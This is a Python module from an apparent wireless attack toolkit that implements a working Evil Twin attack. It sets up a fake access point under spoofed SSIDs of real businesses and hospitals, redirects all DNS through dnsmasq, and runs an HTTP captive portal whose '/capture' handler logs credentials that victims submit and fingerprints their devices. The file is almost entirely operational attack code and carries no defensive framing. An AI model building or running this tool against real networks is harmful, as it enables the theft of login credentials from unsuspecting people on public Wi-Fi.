# WIFI SCANNER  // EVIL TWIN MODULE

from rich.console import Console
import os
import time
import subprocess
import json
from pathlib import Path
from http.server import SimpleHTTPRequestHandler, HTTPServer
from textwrap import dedent
from nsm_utilities import Background_Threads
from nsm_deauth import Frame_Snatcher

console = Console()


class Evil_Twin:
    """This module will allow a user to perform a (passive) Evil Twin attack"""

    @classmethod
    def _choose_portal(cls) -> str:
        """Dictionary of Evil_Twin portals to choose from"""

        portals = {
            1: "LA Fitness",
            2: "Starbucks WiFi",
            3: "Airport_Free_WiFi",
            4: "Marriott_Guest",
            5: "SUBWAY_Free_WiFi",
            6: "McDonalds_Free_WiFi",
            7: "Target Guest WiFi",
            8: "Walmart WiFi",
            9: "Hospital_Guest",
            10: "Public_Library_WiFi",
            11: "Campus_WiFi",
            12: "Panera WiFi",
            13: "BestBuy_Guest",
            14: "CORP_Guest_WiFi",
            15: "Hilton_Honors",
            16: "Delta Sky Club",
            17: "Apple Store",
            18: "YMCA_Member_WiFi",
            19: "Whole_Foods_WiFi",
            20: "CVS WiFi",
        }
        max = 20  # git push

        console.print(portals)

        while True:
            try:
                choice = console.input("\n[bold yellow]Choose portal!: ")
                choice = int(choice)

                if 1 <= choice <= max:
                    portal = f"portal_{choice}"
                    console.print(
                        f"[bold green][+] Evil Twinning --> {portals[choice]}"
                    )
                    return portal, portals[choice]

            except (KeyError, TypeError) as e:
                console.print(f"[bold red][-]Error:[bold yellow] {e}")

            except Exception as e:
                console.print(f"[bold red][-] Exception Error:[bold yellow] {e}")

    @classmethod
    def _get_portal_path(cls, portal: int):
        """This will be used to get the path of the portal to use"""

        # TEMP FIX FOR FILE CRASHING WITHOUT SUDO
        try:
            sudo_user = os.getenv("SUDO_USER")
            USER_HOME = Path(f"/home/{sudo_user}") if sudo_user else Path.home()
            BASE_DIR = USER_HOME / "Documents" / "nsm_tools" / "netcracker"
        except Exception as e:
            console.print(e)
            # SWITCH BACK TO PATH
            BASE_DIR = Path.home() / "Documents" / "nsm_tools" / "netcracker"
            BASE_DIR.mkdir(exist_ok=True, parents=True)

        PORTAL_DIR = BASE_DIR / "portals"
        PORTAL_DIR.mkdir(exist_ok=True, parents=True)

        return PORTAL_DIR, Path(BASE_DIR / "portals" / portal)

    @staticmethod
    def _kill_processes(color="bold red", delay=1):
        """This method will kill any old and up and running processes"""

        console.print(f"[{color}][*] Killing existing hostapd/dnsmasq processes")
        subprocess.run(["pkill", "hostapd"], check=False, stderr=subprocess.DEVNULL)
        subprocess.run(["pkill", "dnsmasq"], check=False, stderr=subprocess.DEVNULL)
        time.sleep(delay)

    @classmethod
    def _configure_interface(cls, iface, gateway_ip="10.0.0.1"):
        """This will configure IP for evil twin"""

        subprocess.run(
            ["systemctl", "stop", "NetworkManager"],
            check=False,
            stderr=subprocess.DEVNULL,
        )
        subprocess.run(["ip", "link", "set", iface, "up"], check=True)
        subprocess.run(["ip", "addr", "flush", "dev", iface], check=True)
        subprocess.run(["ip", "addr", "add", "10.0.0.1/24", "dev", iface], check=True)
        subprocess.run(["ip", "link", "set", iface, "up"], check=True)

        result = subprocess.run(
            ["ip", "addr", "show", iface], capture_output=True, text=True
        )

        if gateway_ip not in result.stdout:
            console.print(f"[bold red][!] Failed to set IP on {iface}")
            return False

        console.print(f"[bold green][+] Configured {iface} with IP 10.0.0.1")

    @classmethod
    def _create_hostapd_conf(
        cls, path, iface, ssid, channel=6, auth_algs=1, verbose=True
    ):
        """This will create hostpad_conf"""

        try:
            data_hostapd = dedent(
                f"""
                interface={iface}
                driver=nl80211
                ssid={ssid}
                hw_mode=g
                channel={channel}
                macaddr_acl=0
                auth_algs={auth_algs}
                ignore_broadcast_ssid=0
                """
            ).strip()
            what = "hostapd_config"

            with open(path, "w") as file:
                file.write(data_hostapd)
            if verbose:
                console.print(
                    f"[bold green][+] Successfully created:[bold yellow] {what} - {path}"
                )
            return path

        except Exception as e:
            console.print(f"[bold red][-] Exception Error:[bold yellow] {e}")

    @classmethod
    def _create_dnsmasq_conf(
        cls,
        path,
        iface,
        dhcp_range_start="10.0.0.10",
        dhcp_range_end="10.0.0.100",
        gateway_ip="10.0.0.1",
        dnsmasq_log="/var/log/dnsmasq_evil.log",
        dnsmasq_leases="/var/lib/misc/dnsmasq.leases",
        verbose=True,
    ):
        """This will create dnsmasq_conf"""

        try:
            data_dnsmasq = dedent(
                f"""
            interface={iface}
            bind-interfaces
            listen-address={gateway_ip}

            # DHCP
            dhcp-range={dhcp_range_start},{dhcp_range_end},12h
            dhcp-option=3,{gateway_ip}
            dhcp-option=6,{gateway_ip}
            dhcp-authoritative

            # DNS - Redirect ALL domains to our portal (wildcard)
            address=/#/{gateway_ip}
            no-resolv
            no-hosts

            # Logging
            log-dhcp
            log-queries
            log-facility={dnsmasq_log}

            # Lease file
            dhcp-leasefile={dnsmasq_leases}
                """
            ).strip()
            what = "dnsmasq.conf"

            with open(path, "w") as file:
                file.write(data_dnsmasq)
            if verbose:
                console.print(
                    f"[bold green][+] Successfully created:[bold yellow] {what} - {path}"
                )
            return path

        except Exception as e:
            console.print(f"[bold red][-] Exception Error:[bold yellow] {e}")

    @classmethod
    def _start_hostapd(cls, path: str, verbose=True):
        """This will launch hostapd"""

        proc = subprocess.Popen(
            ["hostapd", path], stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )

        time.sleep(3)

        if proc.poll() is not None:
            console.print("[bold red][!] hostapd failed to start")
            _, err = proc.communicate()
            console.print(f"[bold red][-]Error: {err.decode()}")
            return False

        if verbose:
            console.print("[bold green][+] Successfully started:[bold yellow] hostapd")
            return True

    @classmethod
    def _start_dnsmasq(cls, path: str, verbose=True):
        """This will launch dnsmasq using /etc/dnsmasq.d/ so it doesn't hit permission denied"""

        result = subprocess.run(["dnsmasq", "-C", path], capture_output=True, text=True)

        if result.returncode != 0:
            console.print(f"[bold red][!] dnsmasq failed:[bold yellow] {result.stderr}")
            return False

        time.sleep(1)
        check = subprocess.run(["pgrep", "dnsmasq"], capture_output=True)

        if check.returncode != 0:
            console.print("[bold red][!] dnsmasq not running")
            return False

        pid = check.stdout.decode().strip()
        console.print(
            f"[bold green][+] Successfully started dnsmasq started (PID: {pid})"
        )
        return True

    @classmethod
    def _terminate_instance(cls, iface):
        """This will cleanup all changes"""

        console.print("\n[bold yellow][*] Cleaning up...")
        subprocess.run(["pkill", "hostapd"], check=False)
        subprocess.run(["pkill", "dnsmasq"], check=False)
        subprocess.run(["ip", "addr", "flush", "dev", iface], check=False)
        subprocess.run(["systemctl", "start", "NetworkManager"], check=False)
        console.print("[bold green][+] Interface clean up completed.")

    class _Evil_Server(SimpleHTTPRequestHandler):
        """Sub class of Evil_Twin for HTTP Requesting handling"""

        def do_GET(self):
            """This will handle http requests that are made"""

            # Get device info
            user_agent = self.headers.get("User-Agent", "Unknown")
            ip_address = self.client_address[0]
            _language = self.headers.get("Accept-Language", "Unknown")

            # Parse device details from User-Agent
            if "iPhone" in user_agent or "iPad" in user_agent:
                device_type = "Apple"
                # Extract iOS version if present (e.g., "iPhone OS 17_1")
                if "iPhone OS" in user_agent:
                    ios_ver = (
                        user_agent.split("iPhone OS ")[1]
                        .split(" ")[0]
                        .replace("_", ".")
                    )
                    device_info = f"iOS {ios_ver}"
                else:
                    device_info = "iOS"
            elif "Mac" in user_agent:
                device_type = "Apple"
                device_info = "macOS"
            elif "Android" in user_agent:
                device_type = "Android"
                # Extract Android version (e.g., "Android 14")
                if "Android " in user_agent:
                    android_ver = user_agent.split("Android ")[1].split(";")[0]
                    device_info = f"Android {android_ver}"
                else:
                    device_info = "Android"
            elif "Windows" in user_agent:
                device_type = "Windows"
                device_info = "Windows"
            elif "Linux" in user_agent:
                device_type = "Linux"
                device_info = "Linux"
            else:
                device_type = "Unknown"
                device_info = "Unknown"

            # Captive portal detection - log device info
            if self.path in ["/hotspot-detect.html", "/library/test/success.html"]:
                console.print(
                    f"[bold cyan][+] {device_type} device connected | IP: {ip_address} | {device_info}"
                )
                self.send_response(302)
                self.send_header(
                    "Location", f"http://{self.headers.get('Host', '10.0.0.1')}/"
                )
                self.end_headers()
                return

            if self.path in ["/generate_204", "/gen_204"]:
                console.print(
                    f"[bold cyan][+] {device_type} device connected | IP: {ip_address} | {device_info}"
                )
                self.send_response(302)
                self.send_header(
                    "Location", f"http://{self.headers.get('Host', '10.0.0.1')}/"
                )
                self.end_headers()
                return

            if self.path in ["/ncsi.txt", "/connecttest.txt"]:
                console.print(
                    f"[bold cyan][+] {device_type} device connected | IP: {ip_address} | {device_info}"
                )
                self.send_response(302)
                self.send_header(
                    "Location", f"http://{self.headers.get('Host', '10.0.0.1')}/"
                )
                self.end_headers()
                return

            try:
                if self.path == "/" or self.path == "":
                    file_path = "index.html"
                else:
                    file_path = self.path.lstrip("/")
                    if ".." in file_path:
                        file_path = "index.html"

                try:
                    with open(file_path, "rb") as f:
                        content = f.read()
                except FileNotFoundError:
                    with open("index.html", "rb") as f:
                        content = f.read()

                if file_path.endswith(".html"):
                    content_type = "text/html"
                elif file_path.endswith(".css"):
                    content_type = "text/css"
                elif file_path.endswith(".js"):
                    content_type = "application/javascript"
                elif file_path.endswith(".png"):
                    content_type = "image/png"
                elif file_path.endswith(".jpg") or file_path.endswith(".jpeg"):
                    content_type = "image/jpeg"
                else:
                    content_type = "text/html"

                self.send_response(200)
                self.send_header("Content-type", content_type)
                self.end_headers()
                self.wfile.write(content)

            except Exception:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"Portal page not found")

        def do_POST(self):
            """Handle credential capture from portals"""

            if self.path == "/capture":
                content_length = int(self.headers["Content-Length"])
                post_data = self.rfile.read(content_length)

                try:
                    data = json.loads(post_data.decode("utf-8"))
                    console.print(
                        f"[bold red][!] CREDENTIALS CAPTURED:[bold yellow] {data}"
                    )
                    Evil_Twin.creds.append(data)
                except Exception:
                    pass

                self.send_response(200)
                self.send_header("Content-type", "application/json")
                self.end_headers()
                self.wfile.write(b'{"status":"ok"}')
            else:
                self.send_response(404)
                self.end_headers()

        @staticmethod
        def _Start_HTTP_Server(path, address="0.0.0.0", port=80):
            """This will launch HTTP Server"""

            os.chdir(str(path))

            server = HTTPServer(
                server_address=(address, port),
                RequestHandlerClass=Evil_Twin._Evil_Server,
            )
            console.print(
                f"[bold green][+] Starting Evil_Twin Server on:[bold yellow] http://localhost:{port}"
            )
            server.serve_forever()

    @classmethod
    def main(cls):
        """This will control class wide logic"""

        # PATHS
        hostapd_conf = "/etc/hostapd/evil_twin.conf"
        dnsmasq_conf = "/etc/dnsmasq.d/evil_twin.conf"
        dnsmasq_log = "/var/log/dnsmasq_evil.log"
        dnsmasq_leases = "/var/lib/misc/dnsmasq.leases"
        _paths = [hostapd_conf, dnsmasq_conf, dnsmasq_log, dnsmasq_leases]

        cls.creds = []

        try:
            iface = Frame_Snatcher.get_interface()
            Frame_Snatcher.welcome_ui(iface=iface, text=" Evil \nTwin", skip=True)
            Background_Threads.change_iface_mode(iface=iface, mode="managed")
            Background_Threads.channel_hopper(set_channel=6)

            portal, ssid = Evil_Twin._choose_portal()
            conf_path, path = Evil_Twin._get_portal_path(portal=portal)
            print("\n")

            Evil_Twin._kill_processes()
            Evil_Twin._configure_interface(iface=iface)

            subprocess.run(["mkdir", "-p", "/etc/dnsmasq.d"], check=True)
            subprocess.run(["mkdir", "-p", "/var/lib/misc"], check=True)
            subprocess.run(["mkdir", "-p", "/var/log"], check=True)
            subprocess.run(["mkdir", "-p", "/etc/hostapd"], check=True)

            path_hostapd = Evil_Twin._create_hostapd_conf(
                path=hostapd_conf, iface=iface, ssid=ssid
            )
            Evil_Twin._start_hostapd(path=path_hostapd)
            path_dnsmasq = Evil_Twin._create_dnsmasq_conf(
                path=dnsmasq_conf,
                dnsmasq_log=dnsmasq_log,
                dnsmasq_leases=dnsmasq_leases,
                iface=iface,
            )
            time.sleep(2)
            Evil_Twin._start_dnsmasq(path=path_dnsmasq)

            Evil_Twin._Evil_Server._Start_HTTP_Server(path=path)

        except KeyboardInterrupt:
            pass
        except Exception as e:
            console.print(f"[bold red]Exception Error:[bold yellow] {e}")

        finally:
            Evil_Twin._terminate_instance(iface=iface)
            console.print(
                f"[bold green][+] Captured Credentials:[bold yellow] {cls.creds}"
            )
            console.input("[bold red]\n\nPress enter to exit: ")

        """
        1. Get interface
        2. Choose portal & SSID
        3. Configure interface IP (10.0.0.1) ✓
        4. Create hostapd.conf
        5. Create dnsmasq.conf
        6. Launch hostapd (fake AP)
        7. Launch dnsmasq (DHCP server)
        8. Start HTTP server (captive portal)
        """
